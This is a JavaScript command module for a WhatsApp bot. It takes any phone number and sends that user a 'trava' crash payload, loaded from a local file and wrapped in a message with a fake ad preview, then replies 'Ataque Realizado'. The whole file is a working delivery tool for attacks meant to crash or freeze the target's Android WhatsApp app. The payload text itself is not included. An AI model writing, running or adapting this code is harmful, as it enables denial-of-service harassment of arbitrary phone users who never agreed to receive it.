import fs from 'fs';
import path from 'path';

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ca', 'crash', 'ola', 'multi-crash'],
    category: 'tools',
    noPrefix: true,
    isOwner: false,

    run: async (conn, m, { args, command }) => {
        try {
            const chat = m.key.remoteJid;

            if (!args[0]) {
                const textoUso = `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]`;
                return await conn.sendMessage(chat, { text: textoUso }, { quoted: m });
            }

            const num = args[0].replace(/[^0-9]/g, '');
            if (!num || num.length < 8) {
                return await conn.sendMessage(chat, { text: '❌ *Número inválido.*' }, { quoted: m });
            }
            const targetJid = `${num}@s.whatsapp.net`;

            const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
            if (!fs.existsSync(pathTrava)) {
                return await conn.sendMessage(chat, { text: '❌ No encontré el archivo en travas/ola.js' }, { quoted: m });
            }

            const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');

            // 1. Reacción de inicio
            await conn.sendMessage(chat, { react: { text: '🚀', key: m.key } });

            // 2. Envío mediante relayMessage (Evita el Time Out)
            // Construimos el nodo del mensaje manualmente
            await conn.relayMessage(targetJid, {
                extendedTextMessage: {
                    text: contenidoTrava,
                    contextInfo: {
                        externalAdReply: {
                            title: '  Misa-Crash',
                            body: 'xxxxxxxxxxxxxxx',
                            mediaType: 1,
                            previewType: 0,
                            sourceUrl: 'https://github.com',
                            thumbnailUrl: 'https://i.pinimg.com/736x/a6/cd/32/a6cd32961c156fb7a1db9c6f14bdb6d6.jpg'
                        }
                    }
                }
            }, {});

            console.log(`[MISA-BOT] Carga enviada con éxito a ${num}`);

            // 3. Confirmación final
            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
            await conn.sendMessage(chat, { 
                text: `✅ *Ataque Realizado*\n> Se envió la carga a @${num}`,
                mentions: [targetJid]
            }, { quoted: m });

        } catch (err) {
            console.error('Error en crash-android:', err);
            // Si hay error de timeout aquí, usualmente es porque el mensaje ya salió pero el socket está lento
        }
    }
};

export default crashAndroidMisa;
